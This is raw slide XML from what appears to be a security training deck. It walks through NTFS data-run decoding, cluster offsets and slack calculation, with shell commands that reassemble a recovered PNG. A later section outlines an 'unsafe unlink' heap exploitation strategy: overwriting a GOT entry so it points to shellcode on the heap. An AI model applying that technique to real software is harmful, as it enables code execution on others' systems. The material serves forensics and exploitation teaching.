              <a:rPr lang="zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>→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→</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="260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相對偏移</a:t>
            </a:r>
            <a:endParaRPr sz="2600">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="26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429144" lvl="0" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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Run 2 LCN = 12,592 + (-5,000) = 7,592 </a:t>
            </a:r>
            <a:endParaRPr sz="26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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1663440630" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="6640341" y="2126871"/>
            <a:ext cx="5319472" cy="1115023"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartAlternateProcess">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="bg1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TW" sz="20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反轉完 bytes 之後，看最高位的 hex digit</a:t>
            </a:r>
            <a:endParaRPr sz="20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r>
              <a:rPr lang="zh-TW" sz="20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最高位 byte &lt; 0x80  →  正數</a:t>
            </a:r>
            <a:endParaRPr sz="20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r>
              <a:rPr lang="zh-TW" sz="20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最高位 byte ≥ 0x80  →  負數</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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44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6634406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63440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663440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072906793" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="232170" y="518317"/>
          <a:ext cx="11727654" cy="69214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837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
              </a:tblGrid>
              <a:tr h="69215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21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18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30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31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22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14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00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78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EC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21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0E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28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chemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>23</a:t>
                      </a:r>
                      <a:endParaRPr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00">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>00</a:t>
                      </a:r>
                      <a:endParaRPr sz="280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943891" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="3596092" y="1737360"/>
          <a:ext cx="8127999" cy="36575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549920"/>
                <a:gridCol w="2549920"/>
              </a:tblGrid>
              <a:tr h="189404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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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9600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>1</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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28649770" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1078195" y="4218166"/>
            <a:ext cx="10830078" cy="2072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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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21    → header: length 1 byte, start 2 bytes</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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0E    → length = 0x0E = 14（clusters）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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71993" indent="-371993">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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28 23 → start = 反轉為 0x2328 (LCN) = 9,000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→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正數</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>/相對偏移</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-TW" sz="26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429143" lvl="0" indent="-371993">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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Run 3 LCN = 7,592 + 9,000 = 16,592 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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71120" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="199697"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>單位換算</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1719606008" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="809454" y="1525259"/>
            <a:ext cx="10581422" cy="3505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>
              <a:defRPr/>
            </a:pP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94022" indent="-394022"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Cluster Size = Bytes per Sector × Sectors per Cluster</a:t>
            </a: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            	= 512 × 8</a:t>
            </a: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            	= 4,096 bytes</a:t>
            </a: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94022" indent="-394022"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Byte Offset = LCN × Cluster Size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             </a:t>
            </a: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= LCN × 4,096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570424552" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0" flipH="0" flipV="0">
          <a:off x="1531249" y="227869"/>
          <a:ext cx="8302623" cy="5535082"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="8302623" cy="5535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6" r:qs="rId7" r:cs="rId5"/>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2042361997" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="3080156" y="5020468"/>
            <a:ext cx="8314531" cy="178593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solidFill>
              <a:schemeClr val="tx1">
                <a:lumMod val="65098"/>
                <a:lumOff val="34902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797"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Liberation Serif"/>
                <a:ea typeface="Liberation Serif"/>
                <a:cs typeface="Liberation Serif"/>
              </a:rPr>
              <a:t>Total Clusters = 24 + 20 + 14 = 58 </a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif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797"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Liberation Serif"/>
                <a:ea typeface="Liberation Serif"/>
                <a:cs typeface="Liberation Serif"/>
              </a:rPr>
              <a:t>Total allocated space  = 58 × 4,096 = 237,568 bytes</a:t>
            </a:r>
            <a:endParaRPr sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Liberation Serif"/>
              <a:cs typeface="Liberation Serif"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1824138009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9694" y="1892774"/>
            <a:ext cx="12191999" cy="3160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13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6638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14087486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68107" y="1126493"/>
            <a:ext cx="11097030" cy="3497100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="261788365" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="4231093" y="873124"/>
            <a:ext cx="1825624" cy="4107656"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartAlternateProcess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29089266" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="9423804" y="821215"/>
            <a:ext cx="1825623" cy="4107655"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartAlternateProcess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5219420" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="579843" y="5020468"/>
            <a:ext cx="10064741" cy="13777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Caladea"/>
                <a:ea typeface="Caladea"/>
                <a:cs typeface="Caladea"/>
              </a:rPr>
              <a:t>Concatenate (組裝) </a:t>
            </a:r>
            <a:endParaRPr sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Caladea"/>
                <a:ea typeface="Caladea"/>
                <a:cs typeface="Caladea"/>
              </a:rPr>
              <a:t>cat run1.bin run2.bin run3.bin &gt; assembled.bin</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:srgbClr val="92D050"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Caladea"/>
                <a:ea typeface="Caladea"/>
                <a:cs typeface="Caladea"/>
              </a:rPr>
              <a:t>cat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Caladea"/>
                <a:ea typeface="Caladea"/>
                <a:cs typeface="Caladea"/>
              </a:rPr>
              <a:t>assembled.bin &gt; manifest_0448.png</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Caladea"/>
              <a:cs typeface="Caladea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="746294187" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="1533772" y="873123"/>
          <a:ext cx="8802842" cy="416129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{E8034E78-7F5D-4C2E-B375-FC64B27BC917}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1440000"/>
                <a:gridCol w="3690000"/>
                <a:gridCol w="3672842"/>
              </a:tblGrid>
              <a:tr h="1040323">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:pPr>
                        <a:defRPr/>
                      </a:pPr>
                      <a:endParaRPr sz="4800">
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:ea typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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4800">
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>Offset</a:t>
                      </a:r>
                      <a:endParaRPr sz="4800">
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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4800">
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>size</a:t>
                      </a:r>
                      <a:endParaRPr sz="4800">
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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1040323">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:pPr>
                        <a:defRPr/>
                      </a:pPr>
                      <a:r>
                        <a:rPr sz="3600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>1</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:ea typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="3600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>3130000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="3600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>18000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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1040323">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:pPr>
                        <a:defRPr/>
                      </a:pPr>
                      <a:r>
                        <a:rPr sz="3600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:ea typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>1DA8000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>14000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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1040323">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:p>
                      <a:pPr>
                        <a:defRPr/>
                      </a:pPr>
                      <a:r>
                        <a:rPr sz="3600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>3</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:ea typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>40D0000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>E000</a:t>
                      </a:r>
                      <a:endParaRPr sz="3600">
                        <a:solidFill>
                          <a:schemeClr val="tx1"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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29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5287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Demo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830719" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="738593" y="272807"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="4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Allocated vs Logical Size</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1726232246" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="737453" y="1706562"/>
            <a:ext cx="11260105" cy="47857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94023" indent="-394023"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Allocated Size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$DATA 往後 40 bytes(0x28)的 8 bytes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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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00 A0 03 00 00 00 00 00 -&gt; 00 03 A0 00 = 237,568 bytes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lvl="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="280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394023" indent="-394023"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Logical Size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再往後 8 bytes(0x30=48)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="28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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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99 97 03 00 00 00 00 00 -&gt; 00 03 97 99 = 235,417</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t> bytes</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:defRPr/>
            </a:pP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94023" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="v"/>
              <a:defRPr/>
            </a:pP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slack = 237,568 - 235,417 = 2,151</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="28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bytes</a:t>
            </a:r>
            <a:endParaRPr sz="28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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="280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trim</a:t>
            </a:r>
            <a:endParaRPr sz="280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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>head -c 235417 assembled.bin &gt; manifest_0448.png</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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1348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Demo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76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5563333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09999" y="340178"/>
            <a:ext cx="4175124" cy="6262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1400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183695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sz="60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Binary Exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="6000">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr sz="6000">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2069676418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sz="3600"/>
              <a:t>Unsafe Unlink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984317" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="0" r="0" b="69246"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="558573" y="544285"/>
            <a:ext cx="10972800" cy="2109106"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1386257106" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:srcRect l="25152" t="30009" r="24313" b="37996"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="3015152" y="2876209"/>
            <a:ext cx="6059640" cy="2397833"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="875454509" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="3008519" y="5444131"/>
            <a:ext cx="7097042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Partial RELRO + NX disabled + No PIE</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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→ 「覆寫某個 GOT entry，</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="24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    把它改成 heap 上的 shellcode 位址」。</a:t>
            </a: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endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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5111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59585460" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="13640" r="0" b="16914"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="74836" y="550051"/>
            <a:ext cx="12056796" cy="5232984"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7676675" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="7077455" y="2228169"/>
            <a:ext cx="449503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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All Symbols</a:t>
            </a:r>
            <a:endParaRPr sz="2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8993657" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="41666" r="0" b="23363"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="120803" y="283578"/>
            <a:ext cx="11932153" cy="2607939"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54722737" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="546026" y="3010579"/>
            <a:ext cx="11317417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49965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2400" b="0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</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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24</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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: 0000000000404090   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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8</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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OBJECT   GLOBAL DEFAULT   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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26</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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p     </a:t>
            </a:r>
            <a:endParaRPr sz="2400" b="0" i="0" u="none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349965" indent="-349965">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2400" b="0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37</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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: 00000000004011f6   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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486</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2400" b="0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FUNC   GLOBAL DEFAULT   </a:t>
            </a:r>
